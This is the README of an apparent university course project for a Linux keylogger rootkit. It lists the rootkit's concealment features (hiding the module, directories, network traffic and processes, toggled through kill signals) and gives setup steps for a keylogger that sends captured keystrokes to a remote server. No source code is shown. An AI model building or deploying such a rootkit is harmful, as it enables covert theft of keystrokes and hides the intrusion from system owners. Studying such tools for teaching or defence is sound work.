# cpsc413-project
Linux keylogger rootkit

Hides self from lsmod (toggle with kill -64 1)
Hides directories with hard-coded prefix (also toggled with kill -64)
Hides network activity over hard-coded IP address
Can hide single process given PID (kill -63 [PID])
Basic debug messages toggled with kill -62 1

keylogger runs with driver. Executable by itself separately:
Uses /dev/input/event2 file (varies with machine)
Sends keylogged information to other machine.
keeps log.txt on sending and recipient machines.

## How to setup server:
gcc server.c -o server
sudo ./server

## How to setup rootkit + sender:
In keylogger.c, change the target address to the IP address of the recipient.
In big_rootkit.c, change the address to be hidden to the IP address of the recipient.
run make in rootkit and make in the main directory
Set up server, then run sudo ./driver
